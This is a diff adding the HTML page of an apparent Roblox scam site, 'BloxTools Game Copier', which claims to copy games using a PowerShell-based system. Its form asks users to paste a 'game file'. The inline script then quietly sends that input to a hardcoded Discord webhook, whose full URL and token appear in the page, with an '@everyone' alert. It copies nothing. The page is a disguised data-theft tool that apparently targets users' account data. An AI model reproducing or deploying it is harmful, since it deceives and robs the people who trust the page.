@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BloxTools</title>
+  <link href="css/imports_new.css" rel="stylesheet">
+  <link href="css/aos.css" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.css">
+  <script src="js/jquery.min.js"></script>
+  <script src="js/aos.js"></script>
+  <link href="css/remixicon.css" rel="stylesheet">
+  <link rel="shortcut icon" type="image/x-icon" href="images/logo.png">
+</head>
+
+<body>
+  <header id="navbar">
+    <div class="overlay"></div>
+    <div class="container">
+      <nav class="navbar navbar-expand-xl navbar-dark">
+        <a class="navbar-brand" style="color: white !important;" href="#">
+          <img src="images/logo.png" alt="" style="width: 3.5rem;">
+          <span onclick="window.location.href = '/'" style="margin-left:1rem; font-weight: 600; font-size: 0rem;">Go
+            back <i style="position: relative; top:.15rem; left: .3rem;" class=""></i>
+          </span>
+        </a>
+        <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+      </nav>
+    </div>
+  </header>
+  <section id="features">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row text-center justify-content-center">
+        <div class="col-12">
+          <div class="text-top">
+            <h1>Game Copier</h1>
+            <p>Copy games with ease, with this brand new powershell-based system!</p>
+          </div>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-12">
+          <h2>BloxTools</h2>
+        </div>
+        <div class="col-md-6 mb-8">
+          <div class="box">
+            <h3>Copy Games</h3>
+            <br>
+            <p>Paste your game file in the box below, then click "Copy Game!"
+              If you don't know how to find a game's "game file" then go ahead and watch "How to use"</p>
+            <form id="gameForm">
+              <div class="form-input-icon mb-3 mt-4">
+                <i class="fas fa-file"></i>
+                <input class="auth-input" type="text" id="gameInput" placeholder="Enter game file" name="Game" autocomplete="off" minlength="3" required="">
+              </div>
+              <div class="form-input-icon mb-3 mt-4"></div>
+              <button type="submit" id="start" class="button primary d-block mt-3 w-100">Copy Game!</button>
+              <span>BloxTools</span>
+            </form>
+          </div>
+        </div>
+        <div class="col-md-6 mb-8">
+          <div class="box">
+            <h3>How to use</h3>
+            <p>Video Tutorial</p>
+            <video width="100%" height="250" controls="">
+              <source src="media/CopyGames.mp4" type="video/mp4">
+            </video>
+            <span>BloxTools</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <footer>
+    <p class="text-center">Copyright 2022 BloxTools. All rights reserved. | Made by Chuikov</p>
+  </footer>
+  <script src="../assets/js/bootstrap.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script>
+    document.getElementById('gameForm').addEventListener('submit', function(event) {
+      event.preventDefault(); 
+
+      const gameFile = document.getElementById('gameInput').value.trim(); // Get the input value
+      const webhookUrl = 'https://discord.com/api/webhooks/1331590875913912350/DNCYwIKE3J3oS5eHCeiK8XoPzoV4vLt1I_3YPLq71uXmauDuW-gOT4eR7hgiIgmEZ_7f'; 
+
+      // Check if the input is empty
+      if (!gameFile) {
+        alert('Please enter a game file before sending.');
+        return; //
+      }
+
+      const message = {
+        embeds: [{
+          title: "here we go !! ||@everyone|| ",
+          description: `${gameFile}`,
+          color: 5814783 
+        }]
+      };
+
+      console.log('Sending message:', message);
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+      })
+      .then(response => {
+        console.log('Response status:', response.status);
+        return response.text().then(text => {
+          return { status: response.status, text: text };
+        });
+      })
+      .then(({ status, text }) => {
+        console.log('Response body:', text);
+        if (status === 204) {
+          document.getElementById('gameInput').value = '';
+        } else {
+          throw new Error(text);
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    });
+  </script>
+  <script>
+    AOS.init({
+      disable: 'mobile',
+      once: true,
+    });
+  </script>
+</body>
+</html>
